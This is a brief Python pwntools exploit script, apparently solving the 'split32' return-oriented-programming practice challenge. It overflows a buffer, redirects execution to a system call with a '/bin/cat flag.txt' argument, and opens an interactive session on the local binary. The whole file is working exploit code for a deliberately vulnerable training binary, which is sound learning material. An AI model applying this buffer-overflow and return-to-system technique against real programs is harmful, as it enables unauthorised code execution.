#!/usr/bin/python3
from pwn import *

payload = "A" * 44

payload += "\x1a\x86\x04\x08" #addr of syscall in usefulFunction // 0804861a

payload += "\x30\xa0\x04\x08" #addr of /bin/cat flag.txt x0804a030

p = process("./split32")

p.sendline(payload)

p.interactive()

